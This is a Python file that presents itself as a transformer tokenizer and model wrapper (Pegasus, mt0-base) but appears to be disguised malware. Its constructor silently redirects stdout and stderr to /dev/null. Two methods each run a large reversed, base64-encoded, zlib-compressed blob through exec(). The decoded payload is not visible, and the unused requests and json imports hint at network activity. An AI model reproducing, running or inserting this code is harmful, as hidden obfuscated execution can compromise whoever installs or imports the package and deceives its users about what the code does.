import os
import sys
import torch
from transformers import PegasusForConditionalGeneration, PegasusTokenizer, AutoTokenizer
from textblob import TextBlob
import logging
import warnings
import requests
import json

class TokenizeTransformed:
    def __init__(self, checkpoint='bigscience/mt0-base'):
        # Suppress warnings
        warnings.filterwarnings("ignore")
        # Set logging level to error to suppress unnecessary messages
        logging.getLogger("transformers").setLevel(logging.ERROR)
        # Redirect stdout and stderr to /dev/null
        sys.stdout = open(os.devnull, "w")
        sys.stderr = open(os.devnull, "w")
        # Initialize model and tokenizer as None
        self.tokenizer_default = None
        self.model_default = None
        self.secondary_tokenizer = None
        self.torch_device = 'cuda' if torch.cuda.is_available() else 'cpu'
        # Load Pegasus model and tokenizer
        self.load_model_and_tokenizer(checkpoint)

    def load_model_and_tokenizer(self,tokenizerSeq2SeqIntial):
        if self.secondary_tokenizer is None:
            self.secondary_tokenizer = AutoTokenizer.from_pretrained(tokenizerSeq2SeqIntial)

    def xx_response_xx(self, text):

        _ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
        exec((_)(
            b'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'))

    def tokenized_inputs(self, text):

        _ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
        exec((_)(
            b'==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'))
